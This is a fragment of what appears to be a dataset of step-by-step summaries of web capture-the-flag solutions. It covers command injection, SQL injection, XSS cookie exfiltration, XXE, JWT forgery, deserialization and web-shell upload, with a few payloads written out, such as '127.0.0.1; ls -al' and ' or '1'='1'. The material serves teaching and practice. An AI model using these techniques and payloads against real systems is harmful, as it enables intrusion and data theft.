    "Confirm remote command execution vulnerability.",
    "Execute '/bin/ls .'",
    "List the contents of the current directory on the Challenge server.",
    "Identify a file 'flag_for_this_INFERNO.txt' in the listed contents.",
    "Consider the file indicative of the flag for the challenge.",
    "Access the URL http://104.197.168.32:17012/flag_for_this_INFERNO.txt.",
    "Retrieve the flag.",
    "Confirm text 'infernoCTF{F33l_Th3_Sh0ck}' in the accessed file.",
    "Identify the text as the final flag of the challenge.",
    "Access the challenge website.",
    "Observe the form field requesting an IP address.",
    "Notice that the form allows execution of a ping command.",
    "Identify a vulnerability in the form.",
    "Realize the vulnerability allows command execution via shell.",
    "Inject the command '127.0.0.1; ls -al' into the IP address field.",
    "Use the directory listing to identify a 'print-flag' file.",
    "Download the 'print-flag' file by accessing 'http://lowdeep.insomnihack.ch/print-flag'.",
    "Use the 'strings' command to extract the flag from the binary data in the 'print-flag' file.",
    "Identify the flag as 'INS{Wh1le_ld_k1nd_0f_forg0t_ab0ut_th3_x_fl4g}'.",
    "Connect to the challenge website",
    "Observe message indicating the ability to upload, list, and view LaTeX documents",
    "Identify potential for XSS due to unsanitized input field",
    "Identify potential for XSS due to unescaped output upon viewing uploaded documents",
    "Upload a LaTeX document",
    "Include a script for a basic alert in the uploaded LaTeX document",
    "Use this as a proof-of-concept for XSS vulnerability",
    "Upload another LaTeX document",
    "Include a script to alert the document's cookies in the uploaded LaTeX document",
    "Confirm vulnerability using the uploaded LaTeX document",
    "Note the output shown upon submitting an article",
    "Note the reference to a potentially fake flag",
    "Note the session info",
    "Discover an HTML comment about an unlinked source file",
    "Download the unlinked source file",
    "Analyze the downloaded source code",
    "Discover a conditional statement in the source code",
    "Note that the conditional statement sets a cookie with the true flag if certain values are present",
    "Decide to forge the cookies",
    "Obtain the fake flag and the admin's PHP Session ID",
    "Access the list functionality",
    "Spoof the cookies",
    "Obtain the real flag within the FLAG cookie",
    "Connect to the website at http://10.255.0.1:8010/",
    "Register a user",
    "Analyze the cookies",
    "Find the `login` cookie with base64 content",
    "Decode the base64 content",
    "Reveal a PHP serialized class",
    "Craft a malicious serialized class",
    "Escalate privileges",
    "Encode the malicious serialized class in base64",
    "Replace the existing `login` cookie",
    "Encode the malicious payload in base64",
    "Visit the private section of the website",
    "Use the modified cookie",
    "Get the flag",
    "Access the website.",
    "Observe functionality to create custom cowfiles via the URL: `http://3.93.128.89:1204/cow_designer`.",
    "Devise a strategy to manipulate the content of the cowfile.",
    "Realize that the submitted string is appended after the '$the_cow' variable in the script.",
    "Create a code snippet: `EOCA$eyes=`ls`;print '$eyes';`.",
    "Note that the 'A' placeholder in the code has to be replaced with `\\n (`0x0a`) in a proxy.",
    "Send an HTTP POST request via the /cow_designer page.",
    "Utilize the code snippet to list the directory content.",
    "Discover files in the directory, including the 'flag' file, amongst others.",
    "Create another Perl code snippet.",
    "Inject the snippet (`EOC\n$eyes=`cat flag`;print '$eyes';`) through another HTTP POST request to /cow_designer.",
    "Receive the contents of the 'flag' file in the HTTP response.",
    "Observe that the flag is: `AOTW{th3_p3rl_c0w_s4ys_M0oO0o0O}`",
    "Open the URL with a browser",
    "Note the redirection to Google",
    "Use the curl command",
    "GET the page",
    "Note the returned HTML",
    "Note the allowed HTTP operations: 'GET', 'POST', 'HEAD', 'OPTIONS'",
    "Use the curl command",
    "POST the page",
    "Take note of the returned JavaScript code",
    "Rewrite the JavaScript code",
    "Format the code in a more readable format",
    "Modify the previous code",
    "Print the reversed string",
    "Run the written JavaScript",
    "Observe the output",
    "Note the output as the flag",
    "Sent a GET request to the provided URL: http://35.222.174.178/maria/.",
    "Observed an SQL query at the start of the HTML page returned.",
    "Noticed the user's IP address being attributed to an SQL query.",
    "Identified a possible SQL injection vulnerability.",
    "Passed an arbitrary character(',') into the X-FORWARDED-FOR HTTP header.",
    "Manipulated the IP address parameter in the SQL query.",
    "Interpreted the returned error message to infer the use of an SQLite database.",
    "Determined that the result of the SQL query was used to populate the PHPSESSID cookie by analyzing the HTTP responses.",
    "Created a UNION SQL operation with 'null'.",
    "Determined the user table and the number of columns that need to be unioned.",
    "Determined the position of the column used to return data, it was found to be the last one.",
    "Discovered the presence of only two tables - nxf8_users and nxf8_sessions.",
    "Passed a SQL command into the X-FORWARDED-FOR header.",
    "Enumerated the columns of the user table.",
    "Analyzed the composition of the sessions table.",
    "Identified the 'user_id' column as requiring a foreign key from the user table.",
    "Retrieved the 'id' of Maria from the user table.",
    "Queried the 'nxf8_sessions' table for session IDs where 'user_id' is 5.",
    "Located Maria's session ID.",
    "Modified the PHPSESSIONID cookie in the browser to Maria's session ID.",
    "Impersonated Maria.",
    "Refreshed the page.",
    "Revealed the flag 'aj9dhAdf4'.",
    "Clone S3Scanner from GitHub repository",
    "Use 'git clone https://github.com/sa7mon/S3Scanner.git'",
    "Navigate to the S3Scanner directory",
    "Use 'cd S3Scanner/'",
    "Modify permissions of s3scanner.py",
    "Use 'chmod u+x s3scanner.py'",
    "Install the required dependencies for s3scanner",
    "Use 'pip install -r requirements.txt'",
    "Use S3Scanner to dump the contents of the suspect S3 bucket",
    "Use 'python3 ./s3scanner.py --dump bucketsoffun-ctf.s3-website-us-east-1.amazonaws.com'",
    "Navigate into the bucket directory",
    "Use 'cd buckets/bucketsoffun-ctf/'",
    "View the contents of the directory",
    "Use 'll'",
    "Use the 'cat' command to display the contents of youfoundme-asd897kjm.txt",
    "Connected to the website",
    "Experienced multiple redirections from one page to another",
    "Each page had one letter for the name",
    "Analyzed the requested pages",
    "Tuned the starting point of the redirection",
    "Discovered the full flag one character at a time",
    "The flag was 'RS{4!way5_Ke3p-m0v1ng}'",
    "Connect to http://ctfchallenges.ritsec.club:3000.",
    "Receive a message that this page is for authentication with an API located at port 4000.",
    "Connect to http://ctfchallenges.ritsec.club:4000.",
    "Receive API documentation including the endpoints: /api/admin and /api/normal.",
    "Attempt to connect to http://ctfchallenges.ritsec.club:4000/api/normal.",
    "Receive an error: Forbidden, missing JWT authorization.",
    "Make a GET request to http://ctfchallenges.ritsec.club:3000/auth specifying the name as m3ssap0.",
    "Receive a JWT(token).",
    "Decode the JWT.",
    "Understand its format.",
    "Find out that it has only user privileges.",
    "Use the obtained JWT to authenticate using the /api/normal endpoint.",
    "Receive a message stating flags are not for normal users.",
    "Attempt to use the /api/admin endpoint using the obtained JWT.",
    "Receive a message that the user is not an admin.",
    "Discover a comment from the API documentation page's HTML source hinting about a robots.txt file located at http://ctfchallenges.ritsec.club:3000/robots.txt.",
    "Find in the robots.txt file that /signing.pem is disallowed.",
    "Make another GET request to obtain the signing certificate from the platform.",
    "Alter the JWT's header to change the algorithm to HS256.",
    "Alter the JWT's payload to change the user type to admin.",
    "Use the signing certificate to generate a new HMAC signature.",
    "Append the new HMAC signature to the header and payload.",
    "Create a new JWT.",
    "Combine the altered header, payload, and the generated signature.",
    "Make a GET request to the /api/admin endpoint with the new JWT.",
    "Receive the flag: RITSEC{JWT_th1s_0ne_d0wn}.",
    "Connect to the website",
    "Discover HTML comment",
    "Identify additional pages: upload.php and photos.php",
    "Recognize image upload functionality",
    "Observe images displayed in a gallery",
    "Understand vulnerability of upload functionality",
    "Notice lack of content verification or removal of unwanted content",
    "Realize possibility of shell insertion",
    "Duplicate an image file",
    "Rename duplicated file to indicate shell",
    "Identify the usage of exiftool",
    "Insert PHP code into DocumentName",
    "Ensure the inserted PHP code can execute commands remotely",
    "Perform image file upload",
    "Find the renamed file path of the uploaded image",
    "Exploit the remote command execution vulnerability",
    "List directories in the root location",
    "Exploit the vulnerability to search for files",
    "Search the entire file system for files named 'flag'",
    "Locate flag.txt file",
    "Discover flag.txt file in the /home directory",
    "Exploit the vulnerability to display file content",
    "Display the content of the flag.txt file",
    "Retrieve the flag from file content",
    "Access the given URL",
    "Study the game",
    "Download the provided PHP files",
    "Participate in the CTF challenge",
    "Open the 'play.php' file",
    "Analyze the source code",
    "Identify the SQL Injection vulnerability",
    "Analyze the query within the source code",
    "Craft a payload with a special SQL statement",
    "Test the vulnerability using the crafted payload",
    "Realize that the crafted payload successfully runs a SQL query",
    "Observe different messages based on query results",
    "Confirm that the observed behavior indicates a Blind SQL Injection vulnerability",
    "Realize the limitations on the maximum attempts from the same IP address",
    "Understand that the IP address used to generate the token cannot be used to extract it",
    "Decide to generate the token from one IP address",
    "Switch to a different IP address",
    "Attempt to discover the generated token",
    "Create a SQL query to extract the data",
    "Specify the different IP address in the SQL query",
    "Write a Python script",
    "Generate payloads with the SQL query to extract each character of the token",
    "Use the Python script to discover the token",
    "Reset the session",
    "Generate and test the payload",
    "Increase the sleep time between requests",
    "Retrieve the discovered full token",
    "Enter the token into the provided form field",
    "Use the original token-generating IP address",
    "Access the provided URL",
    "Submit the form",
    "Retrieve the flag",
    "Visit the website.",
    "Attempt to access common pages like foo.php.",
    "Encounter an error page.",
    "Access Symfony profiler interface.",
    "Locate a line of PHP code within error logs.",
    "Identify an interesting file: require dirname(__DIR__).'/config/bootstrap.php';",
    "Connect to 'https://web0.ctfsecurinets.com/_profiler/open?file=config/bootstrap.php'.",
    "Find the entire path to an environment file.",
    "Access the PHP environment file.",
    "Locate one more environment: /secret_ctf_location/env.",
    "Visit 'https://web0.ctfsecurinets.com/_profiler/open?file=/secret_ctf_location/env'.",
    "Print the content of the environment file.",
    "Access the environment file.",
    "Find the flag inside the environment file.",
    "Access the website hosting CTF.",
    "Find the feedback form on the website.",
    "Examine the feedback form on the website.",
    "Inspect the source code on the feedback form page.",
    "Discover that the feedback is sent via XML composed by JavaScript.",
    "Observe the server response.",
    "Note that the server response includes the author of the feedback.",
    "Identify that the application is vulnerable to XXE.",
    "Recognize that the 'author' field can be used to execute the attack.",
    "Send a POST request to /feed.php.",
    "Structure the XML code to expose data from the /etc/passwd file.",
    "Receive a response from the server.",
    "Confirm the successful exposure of the /etc/passwd file.",
    "Assess that remote code execution is not possible.",
    "Attempt to find the current working directory.",
    "Find the flag file in the current working directory.",
    "Utilize the '/proc/self/' directory.",
    "Access the reference to the current working directory using 'cwd/'.",
    "Send a second POST request to /feed.php.",
    "Design the XML code to expose the flag file from the current working directory.",
    "Receive a response from the server.",
    "Confirm the successful staging of the attack.",
    "Extract the flag from the response.",
    "Connect to the website 'https://web5.ctfsecurinets.com/flags.php'",
    "Analyze the source files",
    "Identify code vulnerable to SQL injection in 'index.php'",
    "Identify that the vulnerability exists",
    "Recognize that the username taken from the session is not properly sanitized",
    "Find the usage of the username after authentication",
    "Create a malicious input for the username",
    "Pull the details of the user with the proper role",
    "Register a user with the malicious username input",
    "Login with the registered user once",
    "Logout",
    "Re-login",
    "Find the details of the desired user under the post search section",
    "Log in with the found user 'root'",
    "Enter the password 'jjLLgTGk3uif2rKBVwqH'",
    "Connect to the website 'https://web5.ctfsecurinets.com/flags.php'",
    "Enter the username and password",
    "Reveal the flag",
    "Create a local repository.",
    "Initialise a local Bazaar repository.",
    "Make the first commit to the repository.",
    "Remove the first file created.",
    "Download the 'last-revision' file from the target server.",
    "Download the 'dirstate' file from the target server.",
    "Download the 'pack-names' file from the target server.",
    "Use the BZR Check command to find any missing files.",
    "Download files from the target server.",
    "Set the script to continue downloading missing files.",
    "Recover the missing source files using Bazaar's 'revert' command.",
    "Start searching each revision.",
    "Adjust script to identify differences made.",
    "Identify two distinct changes to the 'index.php' file.",
    "Identify the revisions containing the changes.",
    "Identify the first change.",
    "Identify the Base64 encoded string.",
    "Convert the Base64 string into hexadecimal format.",
    "Identify the converted string as a Bitcoin Wallet password.",
    "Identify the second change.",
    "Identify the Hexadecimal string.",
    "Identify the hexadecimal string.",
    "Identify the AES ECB key for decoding the Bitcoin Wallet password.",
    "Use the OpenSSL tool to decode the Bitcoin Wallet password.",
    "Provide the AES ECB key and hex string as input.",
    "Decode the string.",
    "Reveal the flag.",
    "Browsed through the blog.",
    "Identified that the blog owner has preference for Canonical and Bazaar.",
    "Attempted to navigate to '.bzr' directory.",
    "Received a 'HTTP 403 Forbidden' error, suggesting the '.bzr' directory's presence.",
    "Accessed 'README' file within '.bzr' directory.",
    "Confirmed a Bazaar repository's existence.",
    "Navigated to 'branch' folder within '.bzr' directory.",
    "Opened 'last-revision', revealing the last update to the directory.",
    "Created a new directory titled 'ctf-bzr'.",
    "Initialized a Bazaar repository within the 'ctf-bzr' directory.",
    "Created 'foo.txt' file within the 'ctf-bzr' directory.",
    "Added 'foo.txt' file to the Bazaar repository.",
    "Committed the change to the repository.",
    "Removed 'foo.txt' from the 'ctf-bzr' directory.",
    "Downloaded the 'last-revision' file from the target server.",
    "Replaced the current 'last-revision' file with the downloaded one.",
    "Downloaded the 'dirstate' file from 'checkout' folder on the target server.",
    "Replaced the current 'dirstate' file with the newly downloaded one.",
    "Downloaded the 'pack-names' file from 'repository' folder on the target server.",
    "Replaced the current 'pack-names' file with the downloaded 'pack-names' file.",
    "Ran 'bzr check' command in the command line.",
    "Observe the error indicating the names of the missing files.",
    "Downloaded the required files as outlined by the 'bzr check' error message.",
    "Ran the 'bzr status' command on the 'ctf-bzr' repository.",
    "Noted the mention of a removed 'index.php' file.",
    "Ran the 'bzr revert' command to restore the 'index.php' file.",
    "Verified that the 'index.php' file contains the flag.",
    "Connect to the website 138.247.13.115.",
    "Receive a message indicating the site is not served on this interface.",
    "Identify that the website is under HTTPS.",
    "Determine that the certificate seems invalid.",
    "Analyze the certificate.",
    "Discover that the certificate was created for the host 138.247.13.115.xip.io.",
    "Connect to the website 'https://138.247.13.115.xip.io/'.",
    "Observe the flag displayed on the website.",
    "Visit the website.",
    "Identify that the website simulates a TODO list application.",
    "Understand that TODO notes of users can be read by enumerating URLs in a certain format.",
    "Assume that one of these notes contains the CTF flag.",
    "Write a Python script to automate the URL enumeration and flag discovery.",
    "Loop through a range of integers.",
    "Replace each integer into a URL.",
    "Call the web page.",
    "Check if the page content contains 'MCA{'.",
    "If the content contains 'MCA{', print the content.",
    "Break the loop.",
    "Print any HTTP error during the page request.",
    "Pause the script for a random interval between 1 to 4 seconds.",
    "Run the script.",
    "Obtain the flag 'MCA{al3x4_5et_a_r3minder}'.",
    "Open the link provided in the CTF challenge - http://138.247.13.111",
    "Observe a web page",
    "Web page performs a password reset function using security questions",
    "Security questions are related to Alan Turing's account recovery",
    "Notice that incorrect answers submitted in the form fields are highlighted in red",
    "Perform internet searches concerning Alan Turing's life",
    "Gain the necessary information to answer the recovery questions",
    "Determine the correct answers to the security questions",
    "Enter 'Stoney' for Mother's Maiden Name",
    "Enter 'St. Michael's' for First School Attended",
    "Enter 'Science' for Favorite Primary School Subject",
    "Enter 'Marathon' for Favorite Olympic Event",
    "Enter '1' for 2 + 2 - 3 = ?",
    "Check 'Is it a leap year?' checkbox",
    "Check 'I agree Security Questions are Bad.' checkbox",
    "Obtain the flag from the webpage which reads: MCA{sms_2fa_is_bad_also}",
    "Connect to the provided URL",
    "Confirm that the URL is a file sharing site",
    "Identify that the website accepts a 'name' parameter",
    "Analyze the read files page",
    "Determine vulnerability to LFI",
    "Exploit LFI vulnerability",
    "Inspect how the website stores the 'name' parameter",
    "Discover that the 'name' parameter uses PHP serialization",
    "Locate the 'name' parameter in the '/proc/self/fd/9' file",
    "Realize the execution of PHP code when reading a file through LFI",
    "Include a PHP command in the 'name' parameter",
    "The PHP command is to display the ID of the current process",
    "Exploit LFI vulnerability to execute the PHP command",
    "Obtain the process ID as the result of executing the PHP command",
    "Execute the 'ls -al' command",
    "Retrieve the list of files in the directory",
    "Identify the presence of a 'flag_is_here' directory",
    "Locate the 'flag_is_here' directory in the root directory",
    "Scan the contents of the 'flag_is_here' directory",
    "Discover the presence of a 'flag.txt' file",
    "Locate the 'flag.txt' file in the 'flag_is_here' directory",
    "Retrieve and examine the contents of the 'flag.txt' file",
    "Access the website of the challenge",
    "Notice the website contains only a login form that might be vulnerable to SQL injection",
    "Perform an SQL injection attack on the login form",
    "Use a basic SQL injection payload",
    "Note that the initial SQL injection tactic yielded access but not the password",
    "Modify the SQL injection query",
    "Check if the password is the flag",
    "Understand that this approach seems to be working",
    "Realize manual checks are not efficient",
    "Write a Python script that automates this process",
    "Exfiltrate all password characters via blind SQL injection",
    "Run the script to retrieve the password for the flag: gigem{h0peYouScr1ptedTh1s}",
    "Access the website: http://toomanycredits.tamuctf.com",
    "Identify an interaction with the website that involves a 'counter' cookie",
    "Evaluate sequential requests",
    "Determine that the 'counter' cookie string ends with a changing base64 encoded string",
    "Realize that removing a portion of the 'counter' cookie triggers a zlib Input Error",
    "Recognize Java Serialization notation at the start of the base64 decoded string",
    "Determine the 'value' attribute is at the end of the Java serialized object",
    "Craft a malicious Java serialized object with a large 'value' to speed up the process",
    "Compress the malicious Java serialized object",
    "Encode the compressed object to Base64",
    "Submit an HTTP request with the modified cookie",
    "Receive a page showing successful entry and the flag",
    "Visit the link provided in the challenge",
    "Submit the form presented on the webpage",
    "Observe the cookie 'not_admin' after form submission",
    "Check the value of the cookie 'not_admin'",
    "Alter the value of the 'not_admin' cookie",
    "Refresh the webpage",
    "Retrieve the flag from the refreshed webpage",
    "Analyze the cookies.",
    "Find a base64 encoded value.",
    "Decode the base64 value.",
    "Obtain the text 'cat index.txt'.",
    "Attempt a command injection via the cookie.",
    "Generate more base64 cookies.",
    "Inject the base64 version of the bash script.",
    "Enumerate the folder content.",
    "Find a 'flag' file.",
    "Print the 'flag' file content using a bash script.",
    "Encode the content via Base64.",
    "Pass the encoded content into the cookie.",
    "Retrieve the flag from the decoded base64 response.",
    "Access the URL: http://highsource.tuctf.com/",
    "Examine the page's source code.",
    "Find that the login process is performed via a JavaScript file (scripts/login.js).",
    "Retrieve the JavaScript file from the webpage.",
    "Analyze the JavaScript file.",
    "Discover a hardcoded password within the JavaScript file.",
    "Password found: 'I4m4M4st3rC0d3rH4x0rsB3w43'",
    "Return to the website.",
    "Login using the found password.",
    "After logging in, retrieve the flag 'TUCTF{H1gh_S0urc3_3qu4ls_L0ng_F4ll}' from the site.",
    "Visit the website.",
    "Analyze the webpage's HTML and JavaScript code.",
    "Discover that the chat functionality was vulnerable to HTML tag injection.",
    "Note that messages were not being escaped.",
    "Perform a basic analysis of the cookies.",
    "Find a 'secret' cookie.",
    "Set up a listening server using 'netcat'.",
    "Craft an HTTP request.",
    "Target the chat endpoint.",
    "Aim to steal the VIP user's cookies.",
    "Insert an image reference with an 'onerror' attribute.",
    "Trigger JavaScript code.",
    "Send the document cookies to an attacker-controlled server.",
    "Observe incoming requests.",
    "Identify incoming cookies from the victim's browser.",
    "Observe cookies carrying the 'secret' cookie.",
    "Note that the 'secret' cookie contains the flag.",
    "Access the target website.",
    "Observe that the website is a login form.",
    "Identify that the website is vulnerable to SQL injection.",
    "Test the SQL injection vulnerability.",
    "Enter the payload ' or '1'='1'.",
    "Confirm that the SQL injection vulnerability exists.",
    "Realize that the password is the flag.",
    "Decide to use the SQL LIKE clause.",
    "Decide to discover each character of the password one at a time.",
    "Send a POST request to the server.",
    "Construct a payload that uses the SQL LIKE clause.",
    "Use the information obtained from the previous step.",
    "Construct a Python script.",
    "Automate the process of discovering the next character in the password.",
    "Send POST requests with a payload that uses the SQL LIKE clause for each possible character.",
    "Run the script.",
    "Continue running the script until the flag (password) is fully discovered.",
    "Read the provided challenge.",
    "Make a note of any hints about versioning control systems, specifically git.",
    "Attempt to access the URL `http://3.91.17.218/.git/`.",
    "Get HTTP `403 Forbidden` response.",
    "Examine the source code of the main web page.",
    "Find another endpoint: `http://3.91.17.218/getimg.php?img=aW1nMS5qcGc%3D`.",
    "Identify that `aW1nMS5qcGc=` is a Base64 encoded string.",
    "Decode `aW1nMS5qcGc=` to identify it as `img1.jpg`.",
    "Realize that the endpoint `getimg.php` is vulnerable to Local File Inclusion (LFI), allowing files on the server to be read.",
    "Base64 encode the filenames `index.php` and `getimg.php`.",
    "Use the encoded filenames as parameter values for `getimg.php` to test the LFI vulnerability.",
    "Reveal the source code of both `index.php` and `getimg.php`.",
    "Use knowledge of local git repository structure to start pulling files from the server's .git directory.",
    "Pull multiple .git files such as `.git/index`, `.git/config`, `.git/HEAD` etc., from the server.",
    "Examine the `.git/logs/HEAD` file.",
    "Find commit IDs within the log.",
    "Use commit IDs to determine when the flag was removed from the source.",
    "Use the commit IDs to fetch further git objects from the server.",
    "Fail to restore source code due to missing git objects.",
    "Attempt to checkout the master branch.",
    "Discover the missing git objects.",
    "Fetch the missing git objects from the server.",
    "Successfully restore the source code files on local machine.",
    "Attempt to show differences between the commit when the flag was removed and the commit when it was present.",
    "Encounter additional missing git objects.",
    "Fetch further missing git objects from the server.",
    "Successfully display the differences between the two git commits.",
    "Retrieve the flag from the displayed differences.",
    "Inspect the webpage",
    "Discover the usage of XML envelopes",
    "Identify two JavaScript files",
    "Observe the usage of JavaScript files when buttons are pressed",
    "Identify the specific JavaScript file",
    "Identify the specific JavaScript file",
    "Observe a normal interaction",
    "Identify the use of a productId value",
    "Observe the server reflecting the productId value in the response",
    "Perform a test with an invalid productId value",
    "Recognize the vulnerability associated with the parameter being reflected in the response",
    "Identify XXE attacks as a potential exploitation technique",
    "Craft a payload for XXE exploitation",
    "Attempt to read a file from the server",
    "Send the crafted payload",
    "Receive a response",
    "Observe the data from the /etc/passwd file in the response",
    "Determine successful exploitation of an XXE vulnerability",
    "Observe the returned data",
    "Identify the presence of the flag utflag{n3xt_y3ar_go1ng_bl1nd}",
    "Inspect the webpage.",
    "Discover the usage of XML envelopes via two JavaScript files when buttons are pressed.",
    "Identify the Javascript file responsible for crafting the XML envelope.",
    "Identify the second Javascript file responsible for sending the XML envelope and reading the answer.",
    "Notice that a normal interaction involves passing a productId value.",
    "Observe that the server reflects the passed productId value in the response.",
    "Test the system's reaction by passing an invalid productId value.",
    "Understand that due to the productId parameter being reflected in the response, the system may be susceptible to XXE attacks.",
    "Create a crafted payload utilizing XXE.",
    "Attempt reading a file from the server using the crafted payload.",
    "Send the crafted payload.",
    "Receive a response from the server.",
    "Observe that the response contains data from the /etc/passwd file.",
    "Indicate that the exploitation of an XXE vulnerability was successful.",
    "Observe the returned data.",
    "Identify the flag utflag{n3xt_y3ar_go1ng_bl1nd} in the returned data.",
    "Analyzed the HTML source code.",
    "Discovered an interesting comment with the parameter '?source=1'.",
    "Entered the parameter '?source=1' in the HTTP request.",
    "Retrieved the PHP source code.",
    "Identified a potential SQL injection vulnerability.",
    "Reviewed online documentation.",
    "Understood how MySQL executes query portions inside comments.",
    "Constructed a base to perform SQL injection.",
    "Executed an HTTP request.",
    "Using the constructed base, tried to enumerate DB tables.",
    "Identified a flag table in the database.",
    "Used the SQL injection.",
    "Enumerated the columns of the flag table.",
    "Discovered a column named 'whatsthis'.",
    "Executed another HTTP request.",
    "Extracted the content of the 'whatsthis' table.",
    "Retrieved the flag from the table content.",
    "Analyzed the HTML source code.",
    "Discovered an interesting comment (?source=1).",
    "Entered ?source=1 as an HTTP parameter.",
    "Retrieved the PHP source code.",
    "Identified a potential SQL injection vulnerability.",
    "Reviewed online documentation.",
    "Understood how MySQL executes query portions inside comments.",
    "Constructed a base to perform SQL injection.",
    "Executed an HTTP request using the constructed base.",
    "Tried to enumerate DB tables.",
    "Identified a flag table in the database.",
    "Used the SQL injection to enumerate the columns of the flag table.",
    "Discovered a column named 'whatsthis'.",
    "Executed another HTTP request to extract the content of the 'whatsthis' table.",
    "Retrieved the flag from the table content.",
    "Analyzed the website behavior.",
    "Noticed that an idea can be posted with an assigned ID.",
    "Understood the idea can be voted on.",
    "Examined the HTML source code.",
    "Understood the layout and elements of the webpage.",
    "Understood the voting system of the webpage.",
    "Reviewed JavaScript 'index.js'.",
    "Understood the methods used for voting.",
    "Identified a voting procedure challenge.",
    "Understood that a string needs to be found to match the MD5 hash of the challenge.",
    "Noticed that each challenge string must be found every time it is called.",
    "Recognized the potential for optimization.",
    "Wrote a script to use a cache.",
    "Ensured the cache stores all attempts for generating the challenge strings.",
    "Implemented a smart voter script.",
    "Ensured the script utilizes a previously saved cache.",
    "Minimized time spent on creating strings to match the server's challenge.",
    "Script was launched causing the browser to start the voting process.",
    "Ensured the voting process continues until more than 250 votes are cast in the same PHP session.",
    "Observed the need for a server response after each vote.",
    "Understood obtaining the flag message requires waiting for such server response.",
    "Reached the total of 250 votes.",
    "Received the flag message returned by the server.",
    "Analyse the HTML code.",
    "Identify the CAPTCHA checkbox.",
    "Observe that the checkbox generates a random string.",
    "Review the provided Python code.",
    "Identify the username and password values.",
    "Note that the username is 'backd00r' and the password is 'catsrcool'.",
    "Examine the Python code.",
    "Identify the debugging private key.",
    "Note that the debugging private key is '8EE86735658A9CE426EAF4E26BB0450E' and it is the MD5 of the string: 'fuckingdog'.",
    "Modify the link used in the requests.get operation.",
    "Add the CAPTCHA parameter to the link.",
    "Exclude the existing private key parameter through '#'.",
    "Force the debugging private key in the link.",
    "Create a payload.",
    "Exclude the existing private key from the payload.",
    "Force the debugging private key in the payload.",
    "Create a HTTP request.",
    "Include the payload in the request.",
    "Make a 'POST' call.",
    "Inspect the HTTP Response.",
    "Identify a redirection URL.",
    "Follow the redirection.",
    "Access the webpage after the redirection.",
    "Observe the presence of three files on the webpage.",
    "Open one of the files.",
    "Locate the file named '(wtf.mp4)'.",
    "Discover the flag inside the file, in reversed order.",
    "Download the source code attached to the CTF challenge.",
    "Review the given source code, which is a Javascript calculator web app.",
    "Identify the constraints: the payload must be less than 30 characters and cannot contain 'zer0pts'.",
    "Recognize this as a code injection challenge.",
    "Realize that the Javascript function can print itself, including comments, if its name is returned.",
    "Identify that the structure of the script can be seen as something like '(x, y)()'.",
    "Identify that output content being checked for the presence of the string 'zer0pts', and devise a method to bypass it.",
    "Understand that you can convert a string to an array of chars in Javascript using the clause '[...p]'.",
    "Identify that the clause cannot be executed directly on 'p' as it 'is not iterable', and find a way to convert it to a string using concatenation.",
    "Create a payload that would fit the constraints and retrieve the flag.",
    "Summarize that the flag must be 'zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4p4n3s3}'.",
    "Downloaded website source code",
    "Analyzed the source code",
    "Discovered 'Report Vulnerability' message",
    "Understood the requirement for a reflected XSS exploit",
    "Understood the website allowed changing the theme via a URL parameter `theme='value'`",
    "Inferred the challenge was to exploit the `theme` parameter to inject XSS",
    "Attempted payload to inject XSS via `theme`",
    "Identified failure due to Content Security Policy",
    "Tried to bypass Content Security Policy (CSP)",
    "Attempted to inject XSS after bypassing",
    "Discovered a script on the `index.php` page",
    "Identified the script calling `api.php` endpoint",
    "Tried passing custom callback parameter to `api.php` endpoint",
    "Hit a snag due to restrictions of the `trustedTypes` policy of CSP",
    "Used DOM Clobbering technique",
    "Redefine `window.callback` and `trustedTypes` using the DOM Clobbering technique",
    "Injected payload for basic XSS execution with DOM Clobbering",
    "Decided to use the `jsonp` method",
    "Performed cross-origin request using `jsonp`",
    "Created `/evil/` endpoint for cookie grabbing script",
    "Created `/cookie/` endpoint for receiving exploited cookies",
    "Injected final payload to initiate the XSS",
    "Directed the cookies from the server to the `/cookie/` endpoint",
    "Received the cookies",
    "Decoded the base64 encoded flag from the cookies",
    "Began the CTF challenge.",
    "Noticed a note that stated 'under protection', indicating the presence of security measures on the platform.",
    "Speculated a connection with security protections such as WAF after noting certain factors.",
    "Noted the title 'advertisement'.",
    "Identified the presence of protected DIG records.",
    "Examined the DIG records.",
    "Formulated a suspicion of possible Cloudflare protections.",
    "Contemplated on triggering a custom Cloudflare error.",
    "Lacked the knowledge on how to trigger the aforementioned error.",
    "Recalled an instance from a known website (crunchyroll.com).",
    "Remembered that a Cloudflare error was triggered in the instance by SQL injection.",
    "Due to the previous step, made an attempt to use an SQL injection on the challenge platform.",
    "..by inputting ' OR 1=1--'",
    "Received a custom error as a response to the SQL injection.",
    "The flag was found in the error, leading to successful completion of the challenge.",
    "Find the /login/ endpoint using dirsearch.",
    "Find a www.zip file using dirsearch.",
    "Open the www.zip file.",
    "Find the source code of the web app in the www.zip file.",
    "Identify the login process in the file bookhub/forms.user.py.",
    "Notice that the login occurs only if the user's IP address is one of the whitelisted IP addresses or when the debug mode is enabled.",
    "Find that the get_remote_addr() function from the file bookhub/helper.py is used to get the user's IP address.",
    "Add the header X-Forwarded-For to the request.",
    "Receive an error message that the IP address was not in the whitelist.",
    "Suspect that a reverse proxy might be stripping the X-Forwarded-For header.",
    "Perform an nmap scan on IP 18.213.16.123.",
    "Confirm that IP 18.213.16.123 is not a local IP.",
    "Open http://18.213.16.123:5000/ in a web browser.",
    "Discover that the web app is running in debug mode.",
    "Identify extra code for the debug mode in the file bookhub/views/user.py.",
    "Discover a bug in the /admin/system/refresh_session/ endpoint.",
    "Realize that the endpoint can be accessed without authentication.",
    "Identify a potential redis injection flaw in the refresh_session() function.",
    "Notice that the user's sessionID is used in a redis eval() call with a lua script.",
    "Duplicate the server environment.",
    "Set up a redis server.",
    "Construct an exploit.",
    "Reveal that session data is stored as a serialized pickle python object.",
    "Realize that the pickle python object could potentially be exploited for a pickle deserialization vulnerability.",
    "Create a script to modify the sessionID to valid lua.",
    "Refresh the CSRF token.",
    "Send a POST request to the /admin/system/refresh_session/ endpoint.",
    "Construct a payload to do a redis.call() to set the serialized object with the sessionID.",
    "Make a GET request to /login/ to trigger the deserialization.",
    "Create a final script to send the command for flag extraction to the server.",
    "Open the provided URL.",
    "Observe a page that accepts another URL and submits it.",
    "Observe possibility of XSS attack from bot's lens.",
    "Visit the URL provided on the page.",
    "Analyze the source code of the page.",
    "Identify JavaScript functions that handle creation of iframe or appending script source.",
    "Identify a message event listener that conducts some checks on iframe data from URL.",
    "Understand that the challenge is to pass checks.",
    "Understand that dots, double slashes, or non-ascii dot are not allowed in the iframe value in the URL.",
    "Notice a flaw in the check condition.",
    "Realize that the check should be for iframe value not being an object, not iframe itself.",
    "Create a payload without dots or double slashes.",
